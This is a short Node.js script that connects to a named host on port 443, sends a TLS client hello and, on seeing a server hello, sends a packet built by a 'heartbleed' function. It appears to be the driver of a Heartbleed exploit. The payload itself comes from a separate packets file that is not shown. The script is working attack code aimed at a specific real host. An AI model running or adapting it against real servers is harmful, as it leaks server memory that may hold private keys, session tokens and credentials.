const net = require('net');
const packets = require('./packets.js');
const parse = require('./parser.js');

console.log('Connecting...');
const socket = net.connect(443, 'tuurdutoit.be', function() {
    console.log('Connected!');
    console.log('Sending client hello...');
    socket.write(packets.hello());
});

socket.on('data', function(buffer) {
    console.log('Received record:');
    const record = parse(buffer);
    console.log(record);

    if(record.type === 0x16 && record.message.type === 0x02) {
        console.log('This is a server hello. Sending heartbeat...');
        socket.write(packets.heartbleed());
    }
});